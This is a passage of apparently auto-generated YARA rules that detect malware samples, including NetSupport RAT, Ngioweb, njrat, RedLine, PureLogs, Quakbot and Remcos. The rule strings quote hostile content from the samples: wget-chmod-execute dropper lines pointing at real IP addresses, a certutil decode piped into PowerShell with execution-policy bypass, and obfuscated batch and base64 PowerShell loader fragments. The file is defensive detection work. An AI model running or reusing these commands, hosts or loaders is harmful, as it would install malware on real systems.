      $x1 = ":: 4jq0CCtydXEBCb5DwyhOqRQcauAyOgrW2PxncJlaCKMafJ83dL2ZD9mWUNkqgyZrPMdV9/CHwnP0PBsCBn35aHer1Y89VWyWP9dB05O36PI169fFLkLK8ap/rHNSt" ascii /* score: '70.00'*/
      $x2 = "type \"%temp%\\ngYjMFUWwRls.ps1\" | \"%systemroot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noprofile -ExecutionPol" ascii /* score: '56.00'*/
      $x3 = "echo duOrUbRyBuXisFpJVWriLWcqzUKOSSTeZjznxiMbuYxC >nul && %tQTepJbsa% -Command \"if((Get-CimInstance -ClassName Win32_DiskDrive)" ascii /* score: '48.00'*/
      $x4 = "echo TPrrFkbXUmIwTVgOoLPeGXzfpeoXpmlLte >nul && %tQTepJbsa% -Command \"if((Get-CimInstance -ClassName Win32_DiskDrive).Model -ma" ascii /* score: '48.00'*/
      $x5 = "echo rvrjoGJEuKdhjNtqHpjmqVRCyyDWTGWsf >nul && %tQTepJbsa% -Command \"if((Get-CimInstance -ClassName Win32_DiskDrive).Model -mat" ascii /* score: '48.00'*/
      $x6 = "type \"%temp%\\ngYjMFUWwRls.ps1\" | \"%systemroot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noprofile -ExecutionPol" ascii /* score: '45.00'*/
      $x7 = "mNWRUFm >nul && %vICugkZUoKT% /f /im cmd.exe /t >nul 2>&1 && echo uIRErGSGjmCumqzocgucb >nul && %bxvwNMiaz% /b 1 )" fullword ascii /* score: '40.00'*/
      $x8 = " 1 ( echo bZbUjIlUvsVZqMKrsObSFJEJL >nul && %vICugkZUoKT% /f /im cmd.exe /t >nul 2>&1 && echo bCqaHRShZqaLySGoNNhmwxFwuKzM >nul " ascii /* score: '40.00'*/
      $x9 = "ffYoGCOytl >nul && %vICugkZUoKT% /f /im cmd.exe /t >nul 2>&1 && echo LNTBcFnkrTRuikZFosdgENxHprl >nul && %bxvwNMiaz% /b 1 )" fullword ascii /* score: '40.00'*/
      $s10 = "certutil -f -decode \"%temp%\\SNHVLReCUPqULVkCh.b64\" \"%temp%\\ngYjMFUWwRls.ps1\" > nul" fullword ascii /* score: '29.00'*/
      $s11 = "echo RQAvAHoAcAA4AHEAQQBRADIAZwB6AEoARQB2AG8AZQAxADEAcgBoAFQARAB3AFAAbQBlAFkAaABTAEIAaQAyAFMAUQBHAHMAOABxADEAQQBnAG8AZgB5AGMASwB" ascii /* score: '23.00'*/
      $s12 = "echo rvrjoGJEuKdhjNtqHpjmqVRCyyDWTGWsf >nul && %tQTepJbsa% -Command \"if((Get-CimInstance -ClassName Win32_DiskDrive).Model -mat" ascii /* score: '23.00'*/
      $s13 = "echo duOrUbRyBuXisFpJVWriLWcqzUKOSSTeZjznxiMbuYxC >nul && %tQTepJbsa% -Command \"if((Get-CimInstance -ClassName Win32_DiskDrive)" ascii /* score: '23.00'*/
      $s14 = "echo TPrrFkbXUmIwTVgOoLPeGXzfpeoXpmlLte >nul && %tQTepJbsa% -Command \"if((Get-CimInstance -ClassName Win32_DiskDrive).Model -ma" ascii /* score: '23.00'*/
      $s15 = "echo TgBoAFkATABGADIAaQBLAEUAcQBvAGEALwBIAFkANwB4AFkAUgAyAFkAVwBxAHkAbwBwAEMAVQBjAFIAUgBkADIARAB5AGUAWQAyAG4AWAA3ADYANwBRAFIANQB" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule NetSupport_signature_ {
   meta:
      description = "_subset_batch - file NetSupport(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cd46379c166c9b750129fde2fdf088276ddf25a4a5d8bb51f1ba9b5c352534a2"
   strings:
      $s1 = "193.24.123.37/client32.exe" fullword ascii /* score: '24.00'*/
      $s2 = "193.24.123.37/client32.ini" fullword ascii /* score: '12.00'*/
      $s3 = "193.24.123.37/NSM.LIC-" fullword ascii /* score: '9.00'*/
      $s4 = "193.24.123.37/client32.iniuR" fullword ascii /* score: '9.00'*/
      $s5 = "193.24.123.37/NSM.LIC" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 50KB and
      all of them
}

rule NetSupport_signature__6df55a74 {
   meta:
      description = "_subset_batch - file NetSupport(signature)_6df55a74.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6df55a745a65940359768c9d5def969469dd00e558d844088ff99905c931924d"
   strings:
      $s1 = "194.0.234.17/client32.exe" fullword ascii /* score: '24.00'*/
      $s2 = "194.0.234.17/client32.ini" fullword ascii /* score: '12.00'*/
      $s3 = "194.0.234.17/NSM.LIC-" fullword ascii /* score: '9.00'*/
      $s4 = "194.0.234.17/client32.inimS]S" fullword ascii /* score: '9.00'*/
      $s5 = "194.0.234.17/NSM.LIC" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 30KB and
      all of them
}

rule NetSupport_signature__f3f44fd3 {
   meta:
      description = "_subset_batch - file NetSupport(signature)_f3f44fd3.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f3f44fd37502cd4b16bca3c3fb1e88a687bd2980926017b0ff1752dc601d4c1e"
   strings:
      $s1 = "NT/remcmdstub.exe" fullword ascii /* score: '22.00'*/
      $s2 = "NT/TCCTL32.DLL" fullword ascii /* score: '20.00'*/
      $s3 = "NT/PCICL32.DLL" fullword ascii /* score: '20.00'*/
      $s4 = "NT/PCICHEK.DLL" fullword ascii /* score: '20.00'*/
      $s5 = "NT/HTCTL32.DLL" fullword ascii /* score: '20.00'*/
      $s6 = "NT/msvcr100.dll" fullword ascii /* score: '20.00'*/
      $s7 = "NT/atmfd.dll" fullword ascii /* score: '20.00'*/
      $s8 = "NT/pcicapi.dll" fullword ascii /* score: '16.00'*/
      $s9 = "NT/ntcache.exe" fullword ascii /* score: '15.00'*/
      $s10 = "NT/nsm_vpro.ini[COMMON]" fullword ascii /* score: '10.00'*/
      $s11 = "+585&5>51" fullword ascii /* score: '9.00'*/ /* hex encoded string 'XUQ' */
      $s12 = "<=%%5%%%922" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Y"' */
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      8 of them
}

rule NetSupport_signature__fe2e428c {
   meta:
      description = "_subset_batch - file NetSupport(signature)_fe2e428c.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fe2e428c302a133a9953157a6d4aeadd0038893359a2777cf947d5257d397923"
   strings:
      $s1 = "client32.exe" fullword ascii /* score: '22.00'*/
      $s2 = "client32.ini" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 60KB and
      all of them
}

rule Ngioweb_signature__eeb94e3e {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_eeb94e3e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eeb94e3edc475f3f89f8d29d44801efd443ec8233f43e5dab28c3b58d242552e"
   strings:
      $s1 = "/bin/systemhelper" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ngioweb_signature__fbd4349c {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_fbd4349c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fbd4349ca36b921a5c7b92c8b87f5084751e38fd91fcb43461974372c46193e9"
   strings:
      $s1 = "/bin/systemhelper" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ngioweb_signature_ {
   meta:
      description = "_subset_batch - file Ngioweb(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "37b704598f9f9508047a8af72b891e20dc297c9b8cdce079fdf7112131d1c7ab"
   strings:
      $s1 = "wget http://178.16.54.225/arm6; chmod 777 arm6; ./arm6 soap" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://178.16.54.225/arm5; chmod 777 arm5; ./arm5 soap" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://178.16.54.225/mpsl; chmod 777 mpsl; ./mpsl soap" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://178.16.54.225/mips; chmod 777 mips; ./mips soap" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://178.16.54.225/arm7; chmod 777 arm7; ./arm7 soap" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Ngioweb_signature__6115ab83 {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_6115ab83.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6115ab83478fbea3e64688c35fd64825ec91a6b4182ea15e102d4740d77f7ae3"
   strings:
      $s1 = "wget http://178.16.54.225/arm5; chmod 777 arm5; ./arm5 zte" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://178.16.54.225/arm7; chmod 777 arm7; ./arm7 zte" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://178.16.54.225/mpsl; chmod 777 mpsl; ./mpsl zte" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://178.16.54.225/mips; chmod 777 mips; ./mips zte" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://178.16.54.225/arm6; chmod 777 arm6; ./arm6 zte" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Nitol_signature_ {
   meta:
      description = "_subset_batch - file Nitol(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "73a9587e15f6da3afceff9d0d64e5cda31eb934282511e01e35c0fb0e432fdd6"
   strings:
      $s1 = "WeChat.exe" fullword ascii /* score: '22.00'*/
      $s2 = "$eDA9QDFm" fullword ascii /* base64 encoded string*/ /* score: '11.00'*/
      $s3 = "WeChat.exePK" fullword ascii /* score: '11.00'*/
      $s4 = "WeChat.exeup" fullword ascii /* score: '11.00'*/
      $s5 = "G<f -u " fullword ascii /* score: '9.00'*/
      $s6 = "gUhD` -" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule Nitol_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash_ {
   meta:
      description = "_subset_batch - file Nitol(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f26500ee852cdb8e17853efc48c3cfb5b08bebdbe2a37bc5a9009ab1b854d64b"
   strings:
      $s1 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s2 = "7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E" fullword ascii /* score: '16.00'*/
      $s3 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii /* score: '16.00'*/
      $s4 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0" fullword ascii /* score: '16.00'*/
      $s5 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 " fullword ascii /* score: '16.00'*/
      $s6 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s7 = "jjkkkk" fullword ascii /* reversed goodware string  */ /* score: '15.00'*/
      $s8 = "NCpjblBLT" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s9 = "-Tencent Technology (Shenzhen) Company Limited1604" fullword ascii /* score: '14.00'*/
      $s10 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s11 = "-Tencent Technology (Shenzhen) Company Limited0" fullword ascii /* score: '14.00'*/
      $s12 = "http://ocsp.digicert.com0]" fullword ascii /* score: '14.00'*/
      $s13 = "Qhttp://cacerts.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crt0_" fullword ascii /* score: '13.00'*/
      $s14 = "Nhttp://crl3.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crl0 " fullword ascii /* score: '13.00'*/
      $s15 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      8 of them
}

rule RedLineStealer_signature__ef471c0edf1877cd5a881a6a8bf647b9_imphash_ {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_ef471c0edf1877cd5a881a6a8bf647b9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd2798e870e14bf530f20438b13b07ad0139353fe6960382b026b94d6c0e696a"
   strings:
      $s1 = "GetValu" fullword ascii /* score: '9.00'*/
      $s2 = "perat?" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule njrat_signature_ {
   meta:
      description = "_subset_batch - file njrat(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f9df0e50ffcebcef8aaaa4d7f4b87091b78cd893a46913115b9289501c059541"
   strings:
      $s1 = "%BFQTD%s%BFQTD%%BFQTD%e%BFQTD%%BFQTD%t%BFQTD% \"YBMCIY=;$NPMDWQXJ = [CoXKCRKPKnsole]::Title;$TQYRXKCRKPKTXFS = Get-Content -XKCR" ascii /* score: '25.00'*/
      $s2 = "%BFQTD%s%BFQTD%%BFQTD%e%BFQTD%%BFQTD%t%BFQTD% \"YBMCIY=;$NPMDWQXJ = [CoXKCRKPKnsole]::Title;$TQYRXKCRKPKTXFS = Get-Content -XKCR" ascii /* score: '22.00'*/
      $s3 = "ZWxlZ2F0ZSAkc3RyYXdiZXJyeVByb3RlY3Rpb25BZGRyZXNzIEAoW0ludFB0cl0sW1VJbnQzMl0sW1VJbnQzMl0sW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jv" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s4 = "eUxhc3RDaGVjayA9ICRiZXJyeU1lbU1hbmFnZXI6OlJlYWRCeXRlKFtJbnRQdHJdOjpBZGQoJEJlcnJ5VGFyZ2V0QWRkcmVzcywgJHN3ZWV0TW9kaWZpY2F0aW9uRGF0" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s5 = "::ipZ8P9IUFG+WZZClPfFyvgVEF7W7FVr1dqz49aEyfamcRFPgJKMYQh83yRVwK45l2dIJEKHr4NczhZEND37OAT9H42YBIiqEpc0eDlohmtWJFBwSLMptONSf5m1eh3" ascii /* score: '21.00'*/
      $s6 = "c2VtYmx5ID0gJHN3ZWV0RGVjb2Rlci5HZXRTdHJpbmcoJGJlcnJ5Q29udmVydGVyOjpGcm9tQmFzZTY0U3RyaW5nKCdVM2x6ZEdWdExsZHBibVJ2ZDNNdVJtOXliWE09" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s7 = "LVN0cmF3YmVycnlEZWxlZ2F0ZSAkc3dlZXRQcm90ZWN0aW9uQWRkcmVzcyBAKFtJbnRQdHJdLFtVSW50MzJdLFtVSW50MzJdLFtVSW50MzJdLk1ha2VCeVJlZlR5cGUo" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s8 = "U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtU2NvcGUgQ3VycmVudFVzZXIgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s9 = "Z2F0ZVR5cGVCdWlsZGVyID0gJGJlcnJ5TW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdTdHJhd2JlcnJ5RGVsZWdhdGVUeXBlJywgJ0NsYXNzLFB1YmxpYyxTZWFsZWQs" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s10 = "bmFtaWNEZWxlZ2F0ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRTdHJhd2Jl" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s11 = "ICAgJHN0cmF3YmVycnlQcm90ZWN0aW9uUmVzdWx0ID0gJHN0cmF3YmVycnlNZW1vcnlQcm90ZWN0b3IuSW52b2tlKCRCZXJyeVRhcmdldEFkZHJlc3MsIDgsIDB4NDAs" ascii /* base64 encoded string */ /* score: '20.00'*/
      $s12 = "ZWN0aW9uRGVsZWdhdGUuSW52b2tlKCRzd2VldFRyYWNpbmdBZGRyZXNzLCAkc3RyYXdiZXJyeU1vZGlmaWNhdGlvbkxlbmd0aCwgMHg0MCwgW3JlZl0kYmVycnlQcmV2" ascii /* base64 encoded string */ /* score: '17.00'*/
      $s13 = "ICAgICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtICRiZXJyeUN1cnJlbnRQcm92aWRlci5QU1BhdGggLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRs" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s14 = "ICAkYmVycnlNZW1NYW5hZ2VyOjpXcml0ZUJ5dGUoW0ludFB0cl06OkFkZCgkQmVycnlUYXJnZXRBZGRyZXNzLCAkc3RyYXdiZXJyeUkpLCAkYmVycnlGaWxsQnl0ZSkg" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s15 = "ICAkc3RyYXdiZXJyeUZ1bmN0aW9uQWRkcmVzcyA9ICRiZXJyeVJlc29sdmVyLkludm9rZSgkbnVsbCwgQCgkYmVycnlIYW5kbGVSZWZlcmVuY2UsICRCZXJyeVByb2Nl" ascii /* base64 encoded string  */ /* score: '17.00'*/
   condition:
      uint16(0) == 0x4625 and filesize < 200KB and
      8 of them
}

rule PureLogsStealer_signature__3 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "66ae43fac5e08560fc8c03fc209221879ea9c420d305a5ddd66c54584f75b792"
   strings:
      $x1 = "::laQmLmUoVAexh43cxh44JXz51yz98HpQiKcLu4HKO2zluwEAzBRgmTRyWbwgSVKVq95tlZuKFiO+l4XTu09i/WU8/BjVUB6GCxMWLJOxzCfA2vlgFCvZyCPca5GaCD" ascii /* score: '64.00'*/
      $s2 = "%CYOII%s%CYOII%%CYOII%e%CYOII%%CYOII%t%CYOII% GPMZIU=C:\\Windows\\System32\\%WVEDCY:KUHHJUD=%" fullword ascii /* score: '22.00'*/
      $s3 = "lAuvPokfMWqwX/YtmLkGQiVm+z4AogGI84izCQcEaMUjAwzjtEmpIph/xIeP3bbo9FTwjPIZseqBmczikEy46FBO0UJke7FqymcD8rbJhK0Jqg1zmbN1jPN27wvKlZX9" ascii /* score: '21.00'*/
      $s4 = "YmFsOnJ1bnRpbWVEYXRhLm5hdGl2ZUludGVyZmFjZSA9ICR0ZXh0RGVjb2Rlci5HZXRTdHJpbmcoJGRhdGFDb252ZXJ0ZXI6OkZyb21CYXNlNjRTdHJpbmcoJ1ZXNXpZ" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s5 = "3i5FC/wEk6mtPfigubSCBm5xo0xZQ1504mKz6/2GkcoU0aNXrs2ATTYvsS8DwVTSmGBP3Xzkfi4/otBSs13h1PUPvNITjk/zWEkxaY7YVR1y18vRPXIDPrJqf7enDUMp" ascii /* score: '21.00'*/
      $s6 = "gM8nDMFq11fVRYFxsE7dXM3TTLpwJmyGrvFYFZ0FKQ+VvzHxr5kAFZtZDf1hWCc22faeUhty6eVtEA9FHlvRYAalk2yPQJeZgHCCFyVQGsDxN/o/+imeQLF0DhcvDuMP" ascii /* score: '21.00'*/
      $s7 = "KM8RmspyM2D6vDNU0VbZvEtiLYUKDAOh56kxxT8YOS/4+z7x1Cfag+x8xfsBqz4J3PuaZHXRqHV8jCOaPyGeT/dK9Y/5kUoBkmbiI301a59j8PlA1kYDzosMlU17XIIh" ascii /* score: '21.00'*/
      $s8 = "sMeKpCx1akadjOpsTHvpaQFqDLlhR2fjQEhO/XxkPJ5QnRCiYUYVpgER1XSfdhM6FY2Z9GFEh73ZuXhY2W1W/Jqc40dgJbLOf8tKRaIjrmd1m8xSZb8D2gEtVITtlm7Q" ascii /* score: '21.00'*/
      $s9 = "ZWdhdGUgPSBCdWlsZC1EeW5hbWljRGVsZWdhdGUgJHByb3RlY3Rpb25BZGRyZXNzIEAoW0ludFB0cl0sW1VJbnQzMl0sW1VJbnQzMl0sW1VJbnQzMl0uTWFrZUJ5UmVm" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s10 = "0qYFsY0zcErjvoouf7q1k6x0J9U0D5f1Tg3NbM6NOL/U0R6YIfCImrzPlvDykqwLdCfck2GC2WsViHZbYZvOmTTPyE49m0NKqABEQq2tybqtbiCDUmPXyhH2vbnGJmeb" ascii /* score: '21.00'*/
      $s11 = "ICRwcm90ZWN0aW9uRGVsZWdhdGUgPSBCdWlsZC1EeW5hbWljRGVsZWdhdGUgJHByb3RlY3Rpb25BZGRyZXNzIEAoW0ludFB0cl0sW1VJbnQzMl0sW1VJbnQzMl0sW1VJ" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s12 = "ID0gJG1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnRGVsZWdhdGVUeXBlJywgJ0NsYXNzLFB1YmxpYyxTZWFsZWQsQW5zaUNsYXNzLEF1dG9DbGFzcycsIFtTeXN0ZW0u" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s13 = "%RRRWU%s%RRRWU%%RRRWU%e%RRRWU%%RRRWU%t%RRRWU% \"YYBOOG=;$OVZCBXKG = [CoKUHHJUDnsole]::Title;$NKUHHJUDTSXOSOR = Get-ConKUHHJUDten" ascii /* score: '20.00'*/
      $s14 = "tMP3z1r3hhOLDjJK6qUPSqHm77TNaLaUKRTWTCjTqDpAaZELrsBMEYeNVy9nzjMjkmn6B2UbcnNyOK1zeABERxFLjquxPfcgJwmZxD4FCX6fqfaDfJfBRNNtKzU8NTTb" ascii /* score: '19.00'*/
      $s15 = "wSkm3TPYH8W1TlQZW5ON5CLr+okGBtPk0kfEEa96rDtMEXecuumEJYRRwiy/yUOxgLPw7uzlIK1Lo2LJseyuIkjwT9l4+opzeudAEb/LRFceh8YP8aBIrVhJuMDYvc7I" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x4525 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule Quakbot_signature_ {
   meta:
      description = "_subset_batch - file Quakbot(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5d8ed12dcb1546e3eb22a5a928cd3f96f79106ccce283c4b1965126c37cab2f3"
   strings:
      $x1 = "C:\\Windows\\System32\\wscript.exe" fullword ascii /* score: '32.00'*/
      $s2 = "(..\\..\\..\\..\\Windows\\System32\\wscript.exe1C:\\Program Files (x86)\\Microsoft\\Edge\\ApplicationN\"\\\\deadly-fascinating-a" wide /* score: '26.00'*/
      $s3 = "}System32" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 3KB and
      1 of ($x*) and all of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1185b5e9 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1185b5e9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1185b5e91551a71f839ed9a8893a4c8b9ab98d079a74fc0967a980e90c8d35c7"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\VTzHEVZzcN\\src\\obj\\Debug\\woCL.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s4 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s6 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADZ}o|" fullword ascii /* score: '27.00'*/
      $s7 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s8 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s9 = "woCL.exe" fullword wide /* score: '22.00'*/
      $s10 = "22222222222222222222222222222222222222222222222222" ascii /* score: '17.00'*/ /* hex encoded string '"""""""""""""""""""""""""' */
      $s11 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
      $s12 = "get_ReceiptID" fullword ascii /* score: '9.00'*/
      $s13 = "* 5j`Z" fullword ascii /* score: '9.00'*/
      $s14 = "get_ProductBarkod" fullword ascii /* score: '9.00'*/
      $s15 = "get_receiptWrite" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2261076a {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2261076a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2261076a897c78824d78af89c1a409308893eab0242e7e04399ed7b7b6c7d245"
   strings:
      $s1 = "UsFp.exe" fullword wide /* score: '22.00'*/
      $s2 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
      $s3 = "targetTimeZoneId" fullword ascii /* score: '14.00'*/
      $s4 = "3https://www.chiark.greenend.org.uk/~sgtatham/putty/0" fullword ascii /* score: '10.00'*/
      $s5 = "kCMT.zEs" fullword ascii /* score: '10.00'*/
      $s6 = "GetCountdownRemaining" fullword ascii /* score: '9.00'*/
      $s7 = "GetStopwatchElapsed" fullword ascii /* score: '9.00'*/
      $s8 = "GetTimeZoneOffset" fullword ascii /* score: '9.00'*/
      $s9 = "GetActiveStopwatches" fullword ascii /* score: '9.00'*/
      $s10 = "GetActiveCountdownTimers" fullword ascii /* score: '9.00'*/
      $s11 = "GetTimeZoneDisplayName" fullword ascii /* score: '9.00'*/
      $s12 = "GetAvailableTimeZones" fullword ascii /* score: '9.00'*/
      $s13 = "GetTimeInTimezone" fullword ascii /* score: '9.00'*/
      $s14 = "hazemark" fullword ascii /* score: '8.00'*/
      $s15 = "stopwatches" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RemcosRAT_signature__46ce5c12b293febbeb513b196aa7f843_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_46ce5c12b293febbeb513b196aa7f843(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1c3b3bc408adc792bbc6401c8d304dbaaa34edfe61d8afce2379efbd2b7fbf95"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s7 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
      $s8 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s9 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s10 = "gangtunnelen" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__46ce5c12b293febbeb513b196aa7f843_imphash__5d37ed38 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_46ce5c12b293febbeb513b196aa7f843(imphash)_5d37ed38.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
